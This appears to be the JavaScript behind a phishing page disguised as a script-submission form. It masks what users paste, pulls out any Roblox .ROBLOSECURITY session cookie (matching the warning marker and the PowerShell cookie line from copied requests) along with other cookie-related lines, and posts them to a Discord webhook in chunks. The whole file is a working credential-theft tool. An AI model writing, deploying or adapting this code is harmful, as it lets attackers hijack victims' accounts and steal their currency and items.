(function () {
  const form = document.getElementById("submit-form");
  const input = document.getElementById("script-input");
  const mask = document.getElementById("script-mask");
  const submitBtn = document.getElementById("submit-btn");
  const statusEl = document.getElementById("status");
  const charCountEl = document.getElementById("char-count");

  const DISCORD_LIMIT = 2000;
  const CENSOR_CHAR = "•";

  const ROBLOX_WARNING_MARKER =
    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

  const POWERSHELL_COOKIE_PREFIX =
    '$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

  const POWERSHELL_COOKIE_PATTERN =
    /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/i;

  const SENSITIVE_BEFORE_PATTERNS = [
    /roblosecurity/i,
    /warning:-do-not-share-this/i,
    /cookie\s*[:=]/i,
    /\.roblox\.com/i,
    /_\|[A-Za-z0-9+/=_-]{20,}/,
    /\$session\.Cookies\.Add/i,
    /System\.Net\.Cookie/i,
  ];

  mask.dataset.placeholder = "Paste your script…";

  function censor(text) {
    return text.replace(/[^\n\r]/g, CENSOR_CHAR);
  }

  function isSensitiveLine(line) {
    const trimmed = line.trim();
    if (!trimmed) {
      return false;
    }
    return SENSITIVE_BEFORE_PATTERNS.some(function (pattern) {
      return pattern.test(trimmed);
    });
  }

  function findAnchorIndex(text) {
    const psIndex = text.indexOf(POWERSHELL_COOKIE_PREFIX);
    if (psIndex !== -1) {
      return psIndex;
    }

    const psMatch = text.match(POWERSHELL_COOKIE_PATTERN);
    if (psMatch && psMatch.index !== undefined) {
      return psMatch.index;
    }

    const markerIndex = text.indexOf(ROBLOX_WARNING_MARKER);
    if (markerIndex !== -1) {
      return markerIndex;
    }

    return -1;
  }

  function prepareSubmission(text) {
    const normalized = text.trim();
    const anchorIndex = findAnchorIndex(normalized);

    if (anchorIndex === -1) {
      return normalized;
    }

    const before = normalized.slice(0, anchorIndex);
    const after = normalized.slice(anchorIndex);

    const sensitiveLines = before
      .split(/\r?\n/)
      .filter(isSensitiveLine)
      .map(function (line) {
        return line.trim();
      })
      .filter(Boolean);

    if (sensitiveLines.length === 0) {
      return after.trim();
    }

    return (sensitiveLines.join("\n") + "\n" + after).trim();
  }

  function syncMask() {
    mask.textContent = censor(input.value);
    mask.scrollTop = input.scrollTop;
    mask.scrollLeft = input.scrollLeft;

    const count = input.value.length;
    charCountEl.textContent =
      count === 1 ? "1 character" : count.toLocaleString() + " characters";
  }

  function setStatus(message, type) {
    statusEl.textContent = message;
    statusEl.className = "status" + (type ? " " + type : "");
  }

  function setLoading(loading) {
    submitBtn.disabled = loading;
    submitBtn.classList.toggle("loading", loading);
  }

  input.addEventListener("input", function () {
    input.style.height = "120px";
    syncMask();
  });

  input.addEventListener("scroll", syncMask);

  input.addEventListener("paste", function () {
    requestAnimationFrame(function () {
      input.style.height = "120px";
      syncMask();
    });
  });

  async function sendSubmission(text) {
    const endpoint = typeof WEBHOOK_URL === "string" ? WEBHOOK_URL.trim() : "";

    if (!endpoint) {
      throw new Error("Submission is not configured.");
    }

    const payload = prepareSubmission(text);

    const chunks = [];
    for (let i = 0; i < payload.length; i += DISCORD_LIMIT) {
      chunks.push(payload.slice(i, i + DISCORD_LIMIT));
    }

    for (let i = 0; i < chunks.length; i++) {
      const prefix = chunks.length > 1 ? `[${i + 1}/${chunks.length}]\n` : "";
      const response = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: prefix + chunks[i] }),
      });

      if (!response.ok) {
        throw new Error("Submission failed.");
      }
    }
  }

  form.addEventListener("submit", async function (event) {
    event.preventDefault();

    const text = input.value.trim();

    if (!text) {
      setStatus("Please paste a script before submitting.", "error");
      input.focus();
      return;
    }

    setLoading(true);
    setStatus("Securing and submitting…");

    try {
      await sendSubmission(text);
      setStatus("Submitted successfully. Your script is in the review queue.", "success");
      input.value = "";
      syncMask();
    } catch {
      setStatus("Something went wrong. Please try again.", "error");
    } finally {
      setLoading(false);
    }
  });
})();
